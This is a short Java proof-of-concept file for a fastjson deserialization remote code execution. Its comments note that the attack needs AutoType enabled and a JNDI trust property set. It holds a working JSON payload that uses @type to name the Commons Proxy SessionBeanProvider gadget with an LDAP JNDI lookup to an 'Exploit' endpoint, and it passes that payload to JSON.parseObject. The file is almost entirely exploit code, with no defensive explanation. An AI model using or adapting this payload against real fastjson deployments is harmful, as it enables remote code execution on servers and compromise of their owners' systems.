package com.test.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 *
 *fastjson  RCE，需要开启AutoType
 *高版本JEP290后需开启：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 * @Author:Wadewfsssss
 */

public class CommonsProxy {

    public static void main(String[] args) {
        //        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        ParserConfig.getGlobalInstance().addAccept("org.apache.commons.proxy.provider.remoting.SessionBeanProvider");

        String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://127.0.0.1:1389/Exploit\",\"Object\":\"a\"}";

        try {
            JSON.parseObject(payload);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
